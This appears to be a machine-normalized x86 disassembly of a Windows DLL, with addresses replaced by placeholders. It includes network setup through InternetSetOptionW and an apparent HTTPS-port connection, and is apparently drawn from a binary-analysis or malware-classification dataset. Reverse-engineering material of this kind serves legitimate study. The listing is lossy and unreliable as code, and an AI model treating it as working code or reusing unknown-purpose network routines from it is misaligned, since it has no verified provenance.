mov eax [ fs : 0x0 ]
push eax
sub esp 0x100
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
xor ebx ebx
push ebx
push ebx
push 0x2a
push ebx
mov [ ebp - 0x104 ] eax
mov [ ebp - 0xf0 ] ecx
mov [ ebp - 0x100 ] edx
call [ InternetSetOptionW@IAT ]
mov eax [ ebp + 0x14 ]
mov [ rw-data ] eax
cmp eax ebx
jne r-xdata
lea ecx [ ebp - 0x3c ]
push ecx
push 0xa
call sub_1004d650
lea eax [ ebp - 0x3c ]
add esp 0x8
mov [ ebp - 0xd0 ] 0xf
mov [ ebp - 0xd4 ] ebx
mov [ ebp - 0xe4 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
push 0xa5
call sub_1001df01
mov esi [ ebp + 0x18 ]
mov edi eax
mov ecx 0x29
[ edi ] [ esi ]
push 0xdc
mov [ ebp - 0xec ] eax
movsb [ edi ] [ esi ]
call sub_1001df01
mov esi eax
mov eax [ ebp - 0xec ]
add esp 0x8
xor edi edi
mov [ ebp - 0xe8 ] eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x3c ]
push edx
lea ecx [ ebp - 0xe4 ]
call sub_10037e00
push 0x4
mov [ ebp - 0x4 ] ebx
call sub_1001f84c
add esp 0x4
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x4 ] 0x1
cmp eax ebx
je r-xdata
mov eax [ ebp - 0xe8 ]
mov cx [ eax ]
mov [ esi ] cx
mov dl [ eax + 0x2 ]
mov [ esi + 0x2 ] dl
mov cl [ edi + rw-data ]
mov eax [ esi ]
push ebx
lea edx [ ebp - 0xf8 ]
and eax 0xffffff
mov [ ebp - 0xf4 ] cl
push edx
mov ecx rw-data
mov [ ebp - 0xf8 ] eax
call sub_10061460
push eax
lea eax [ ebp - 0x10c ]
push eax
mov ecx rw-data
call sub_1002c7e0
add [ ebp - 0xe8 ] 0x3
inc edi
add esi 0x4
cmp edi 0x37
jl r-xdata
xor esi esi
push ebx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov ecx eax
call sub_10068f00
mov esi eax
jmp r-xdata
lea ecx [ ebp - 0xe4 ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
call sub_1006a820
add esp 0x8
cmp [ ebp - 0x60 ] 0x8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x4 ] 0x2
jae r-xdata
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x4 ] bl
cmp esi ebx
jne r-xdata
push ebx
push ebx
push 0x1bb
push ebx
push eax
mov ecx esi
call sub_10046090
mov edi eax
mov [ ebp - 0xfc ] edi
cmp edi ebx
jne r-xdata
lea eax [ ebp - 0x74 ]
mov eax r--data
jmp r-xdata
mov eax [ ebp - 0xe4 ]
push eax
call sub_100187af
add esp 0x4
mov esi [ ebp - 0xf0 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ ebp - 0x60 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_10037e00
lea eax [ ebp - 0x58 ]
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10021bf0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
xor ecx ecx
cmp [ ebp - 0xd0 ] 0x10
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_100187af
add esp 0x4
mov esi [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x58 ]
push ecx
call sub_100187af
add esp 0x4
mov edx [ ebp - 0xe4 ]
push edx
call sub_100187af
add esp 0x4
mov eax r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_10037e00
lea edx [ ebp - 0x58 ]
push edx
mov ecx rw-data
mov [ ebp - 0x4 ] 0x4
call sub_10021bf0
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
mov esi [ ebp - 0x104 ]
lea ecx [ ebp - 0xe8 ]
push ecx
push 0x13
call sub_1004d650
mov eax esi
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x58 ]
push eax
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push esi
lea ecx [ ebp - 0x58 ]
call sub_10037e00
lea edx [ ebp - 0x58 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0x5
call sub_10057800
add esp 0xc
cmp [ ebp - 0x44 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_100187af
add esp 0x4
push ebx
push r--data
mov ecx rw-data
call sub_10037e00
lea ecx [ ebp - 0x90 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
mov [ ebp - 0x10c ] r--data
mov [ ebp - 0x108 ] ebx
call sub_1006a820
add esp 0x8
mov esi 0x8
mov [ ebp - 0x4 ] 0x9
cmp [ eax + 0x14 ] esi
jb r-xdata
lea eax [ ebp - 0x28 ]
push eax
push 0x8
call sub_1004d650
push rw-data
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
call sub_100403d0
add esp 0x14
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x8
call sub_1005e580
cmp [ ebp - 0x98 ] 0x10
mov [ ebp - 0x4 ] 0x7
jb r-xdata
push 0xa00000
push r--data
lea ecx [ ebp - 0x10c ]
push ecx
push 0x1
push ebx
push eax
push 0x1
mov ecx edi
call sub_10013180
push eax
lea ecx [ ebp - 0xf8 ]
mov [ ebp - 0xf8 ] ebx
mov [ ebp - 0xf4 ] ebx
call sub_1005aad0
mov [ ebp - 0x4 ] 0xb
cmp [ ebp - 0x98 ] esi
jb r-xdata
mov eax [ eax ]
mov eax [ ebp - 0xac ]
push eax
call sub_100187af
add esp 0x4
mov esi [ ebp - 0xf8 ]
xor eax eax
mov edi 0x7
mov [ ebp - 0x98 ] edi
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] ax
cmp esi ebx
je r-xdata
mov edx [ ebp - 0xac ]
push edx
call sub_100187af
add esp 0x4
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
push ebx
push ebx
mov ecx esi
call sub_10040740
test eax eax
je r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
lea ecx [ ebp - 0xec ]
push ecx
lea edx [ ebp - 0xf0 ]
push edx
mov ecx esi
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xec ] ebx
call sub_10061670
cmp [ ebp - 0xec ] ebx
je r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov esi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov eax [ ebp - 0xf0 ]
push eax
call sub_1004d480
lea ecx [ ebp - 0x1c ]
push ecx
push 0xd
mov edi eax
call sub_1004d650
sub esp 0x10
mov esi esp
lea eax [ ebp - 0x1c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ ebp - 0x100 ] esp
mov [ esi ] bl
lea ecx [ eax + 0x1 ]
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_100187af
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov esi 0x10
cmp [ ebp - 0x7c ] esi
jb r-xdata
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
push eax
lea edx [ ebp - 0x1c ]
push edx
mov ecx esi
call sub_10037e00
mov eax [ edi + 0x4 ]
push 0x26
push eax
call sub_10072c90
mov ecx [ edi + 0x4 ]
push ecx
call sub_10072a30
mov esi [ ebp - 0xf4 ]
add esp 0x28
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax r--data
jmp r-xdata
xor edx edx
cmp [ ebp - 0xd0 ] esi
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] dx
jmp r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
jb r-xdata
mov ecx [ ebp - 0x90 ]
push ecx
call sub_100187af
add esp 0x4
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
cmp [ ebp - 0x7c ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
jb r-xdata
xor eax eax
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] ax
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_100187af
add esp 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov [ ebp - 0x7c ] 0xf
mov [ ebp - 0x80 ] ebx
mov [ ebp - 0x90 ] bl
cmp [ rw-data ] ebx
je r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_100187af
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0xe4 ]
push ecx
call sub_100187af
add esp 0x4
mov eax r--data
jmp r-xdata
push edi
push r--data
call sub_1004d3a0
add esp 0x8
push ebx
push r--data
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
call sub_10037e00
mov esi [ rw-data ]
mov [ ebp - 0x4 ] 0xc
cmp esi [ rw-data ]
je r-xdata
mov edi [ ebp - 0xfc ]
jmp r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov esi [ ebp - 0xb8 ]
inc esi
push esi
call sub_1000b33e
push esi
mov edi eax
push ebx
push edi
call sub_1007f940
mov eax [ ebp - 0xc8 ]
mov esi 0x10
add esp 0x10
cmp [ ebp - 0xb4 ] esi
jae r-xdata
lea edx [ ebp - 0xf0 ]
push edx
push 0x3
mov edi 0x10
call sub_1004d650
lea eax [ ebp - 0xf0 ]
add esp 0x8
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0xb8 ]
push ecx
push eax
push edi
call sub_1007f5d0
add esp 0xc
cmp [ ebp - 0xb4 ] esi
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push ebx
lea eax [ ebp - 0xf0 ]
push eax
mov ecx esi
call sub_100075f0
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x60 ] 0x8
mov [ ebp - 0xb4 ] 0xf
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xc8 ] bl
jb r-xdata
mov edx [ ebp - 0xc8 ]
push edx
call sub_100187af
add esp 0x4
mov ecx [ esi + 0x10 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
jne r-xdata
mov eax [ esi + 0x10 ]
dec eax
push eax
push 0x1
lea ecx [ ebp - 0x90 ]
push ecx
mov ecx esi
call sub_10062d50
lea edx [ ebp - 0xec ]
push edx
push 0x7
mov [ ebp - 0x4 ] 0xd
call sub_1004d650
lea eax [ ebp - 0xec ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edi [ eax + 0x1 ]
xor ecx ecx
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x74 ] cx
cmp [ ebp - 0xd0 ] esi
jb r-xdata
mov eax [ ebp - 0x74 ]
push eax
call sub_100187af
add esp 0x4
lea eax [ ebp - 0xe8 ]
push eax
push 0x1
call sub_1004d650
lea eax [ ebp - 0xe8 ]
add esp 0x8
mov [ ebp - 0x44 ] 0xf
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x58 ] bl
lea edx [ eax + 0x1 ]
dec ecx
push ecx
push ebx
lea eax [ ebp - 0xac ]
push eax
mov ecx esi
call sub_10062d50
push 0xffffffff
push ebx
lea ecx [ ebp - 0xac ]
push ecx
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x10
call sub_1005e580
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edi
push eax
lea eax [ ebp - 0xec ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_10037e00
lea ecx [ ebp - 0x58 ]
push ecx
lea edx [ ebp - 0x90 ]
push edx
lea eax [ ebp - 0xac ]
push eax
mov [ ebp - 0x4 ] 0xe
call sub_10021ca0
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0xf
call sub_1005e580
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
mov eax edi
mov edx [ ebp - 0xe4 ]
push edx
call sub_100187af
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0xe8 ]
push ecx
lea ecx [ ebp - 0x58 ]
call sub_10037e00
mov [ ebp - 0x4 ] 0x11
cmp [ esi + 0x14 ] edi
jb r-xdata
add esi 0x1c
cmp esi [ rw-data ]
jne r-xdata
mov edx [ ebp - 0xac ]
jmp r-xdata
mov edi 0x10
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_100187af
add esp 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edx
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x7c ] edi
jb r-xdata
mov edx [ ebp - 0x58 ]
push edx
call sub_100187af
add esp 0x4
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] ebx
mov [ ebp - 0xac ] bl
mov [ ebp - 0x4 ] 0xc
cmp [ ebp - 0x44 ] edi
jb r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_100187af
add esp 0x4
lea edx [ ebp - 0x58 ]
push edx
push eax
lea eax [ ebp - 0xac ]
push eax
call sub_10057800
add esp 0xc
push 0xffffffff
push ebx
push eax
lea ecx [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] 0x12
call sub_1005e580
cmp [ ebp - 0x98 ] edi
jb r-xdata
mov eax [ ebp - 0x90 ]
push eax
jmp r-xdata
mov edx [ ebp - 0x58 ]
call sub_100187af
add esp 0x4
sub_1001613a
mov edi edi
push esi
push 0x18
mov esi ecx
call sub_1001f84c
push eax
mov [ esi ] eax
call sub_1002ad20
pop ecx
pop ecx
mov eax esi
pop esi
retn
sub_10016160
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x1fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10069ac6
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10024fe9
lea eax [ ecx * 8 ]
push eax
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_100161b4
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
call sub_1004d707
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push eax
lea ecx [ esi + 0x14 ]
call sub_1004ed30
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax r--data
mov eax r--data
push [ ebp + 0xc ]
push 0x0
call sub_1004d707
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
lea ecx [ esi + 0x1c ]
call sub_1004ed30
pop esi
pop ebp
retn
sub_10016220
push ebp
mov ebp esp
push 0xffffffff
push sub_10087151
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
xor eax eax
sub ecx eax
je r-xdata
push 0xe8
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
dec ecx
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1006b530
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xf0
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_10018e60
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x2e8
call sub_1001f84c
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_10014880
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10016360
push ebp
mov ebp esp
push 0xffffffff
push sub_100882f8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x30 ] eax
mov eax [ ebx + 0x10 ]
push r--data
xor edi edi
mov ecx ebx
call sub_1001a2f0
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov ecx [ esi ]
push edx
lea esi [ ebp - 0x2c ]
call sub_10056d40
add esp 0x4
push eax
mov ecx ebx
mov [ ebp - 0x4 ] edi
call sub_100649e0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
sub_10016400
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x1c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop ebx
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp + 0x10 ] 0x1
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
movzx edx [ edi ]
je r-xdata
test ecx ecx
je r-xdata
pop edi
pop esi
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
add edi 0x2
dec ebx
jne r-xdata
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_10016470
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0x9249249
ja r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_10069ac6
push r--data
lea edx [ ebp - 0xc ]
push edx
mov [ ebp - 0xc ] r--data
call sub_10024fe9
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
push eax
call sub_1001f84c
add esp 0x4
test eax eax
jne r-xdata
sub_100164d0
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x5c
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_100404a0
mov eax esi
mov esp ebp
pop ebp
retn
sub_100164fc
push 0x8
push r--data
call sub_1007fb20
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1007fb65
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_10035d06
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_10035d06
pop ecx
push 0xd
call sub_10058c10
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_10035d06
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10016616
push 0xc
call sub_10058c10
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10016622
push esi
call sub_10035d06
pop ecx
push edi
call sub_10070772
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_10035d06
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10006356
pop ecx
sub_10016647
push 0x58
mov eax sub_10085b5f
call sub_1003fae8
movzx eax [ ebp + 0x18 ]
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x54 ] eax
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10013950
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10071f2c
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_10034a80
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] ax
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx ebx [ ebp + 0x1c ]
mov edx [ ecx ]
push ebx
push eax
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ edx + 0x1c ]
mov eax edi
jmp r-xdata
call sub_1006e90e
mov [ ebp - 0x4 ] 0x3
call sub_10055b84
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_1004642f
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_10027f5a
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_1003c519
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x54 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1006ff82
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_1001018f
mov ecx [ eax ]
push edi
push [ ebp - 0x54 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x50 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_1006ff82
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_1003c519
mov eax [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_100167b0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x41c ] eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
